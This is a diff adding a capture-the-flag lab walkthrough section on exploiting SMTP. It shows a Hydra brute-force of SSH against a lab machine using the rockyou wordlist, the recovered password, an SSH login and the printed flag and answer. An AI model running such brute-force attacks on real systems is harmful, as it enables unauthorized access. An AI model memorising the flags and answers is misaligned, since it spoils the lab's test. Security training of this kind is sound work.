@@ -662,3 +662,89 @@ msf6 auxiliary(scanner/smtp/smtp_enum) > run
 [*] Auxiliary module execution completed
 
 TASK 7: Exploiting SMTP
+- We know from our port scan, that the only other open port on this machine is an SSH login. We're going to use this information to try and bruteforce the password of the SSH login for our user using Hydra.
+- at the end of our Enumeration section we have a few vital pieces of information:
+	1. A user account name : administrator
+	2. The type of SMTP server and Operating System running : SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
+- The syntax for the command we're going to use to find the passwords is this:
+
+	hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV MACHINE_IP ssh 
+
+Let's break it down:
+SECTION				FUNCTION
+hydra				Runs the hydra tool
+-t 16 	                	Number of parallel connections per target
+-l [user]			Points to the user who's account you're trying to compromise
+-P [path to dictionary]		Points to the file containing the list of possible passwords
+-vV				Sets verbose mode to very verbose, shows the login+pass combination for each attempt
+[machine IP]			The IP address of the target machine
+ssh / protocol			Sets the protocol
+
+a. What is the password of the user we found during our enumeration stage?
+sol. alejandro
+┌──(kali㉿kali)-[~]
+└─$ sudo hydra -t 6 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.254.136 ssh
+[sudo] password for kali: 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-23 01:30:57
+[DATA] max 6 tasks per 1 server, overall 6 tasks, 14344399 login tries (l:1/p:14344399), ~2390734 tries per task
+[DATA] attacking ssh://10.10.254.136:22/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://administrator@10.10.254.136:22
+[INFO] Successful, password authentication is supported by ssh://10.10.254.136:22
+[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "password" - 4 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "princess" - 6 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "1234567" - 7 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "rockyou" - 8 of 14344399 [child 2] (0/0)
+...
+[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "12345678" - 9 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "abc123" - 10 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "nicole" - 11 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "daniel" - 12 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "killer" - 143 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "sandra" - 144 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "alejandro" - 145 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "buster" - 146 of 14344399 [child 4] (0/0)
+[22][ssh] host: 10.10.254.136   login: administrator   password: alejandro
+[STATUS] attack finished for 10.10.254.136 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-23 01:34:25
+                                                                                     
+b. Great! Now, let's SSH into the server as the user, what is contents of smtp.txt
+sol. THM{who_knew_email_servers_were_c00l?}
+
+┌──(kali㉿kali)-[~]
+└─$ ssh administrator@10.10.254.136
+administrator@10.10.254.136's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Oct 23 05:39:29 UTC 2024
+
+  System load:  0.09              Processes:           89
+  Usage of /:   43.9% of 9.78GB   Users logged in:     0
+  Memory usage: 31%               IP address for eth0: 10.10.254.136
+  Swap usage:   0%
+
+
+87 packages can be updated.
+35 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Apr 22 22:21:42 2020 from 192.168.1.110
+administrator@polosmtp:~$ ls
+dead.letter  Maildir  smtp.txt
+administrator@polosmtp:~$ cat smtp.txt 
+THM{who_knew_email_servers_were_c00l?}
+
+TASK 8: Understanding MySQL
